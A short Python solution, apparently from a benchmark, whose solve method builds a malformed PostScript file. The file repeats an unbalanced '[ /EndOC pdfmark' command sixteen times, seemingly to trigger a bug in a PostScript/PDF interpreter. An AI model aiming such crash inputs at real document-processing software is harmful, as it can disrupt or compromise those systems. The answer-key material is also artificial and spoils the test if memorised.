import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        payload_lines = [
            "%!PS-Adobe-3.0",
            "<< /PageSize [200 200] >> setpagedevice",
            "newpath 10 10 moveto 190 190 lineto stroke",
        ]
        for _ in range(16):
            payload_lines.append("[ /EndOC pdfmark")
        payload_lines.append("showpage")
        payload = "\n".join(payload_lines) + "\n"
        return payload.encode("ascii")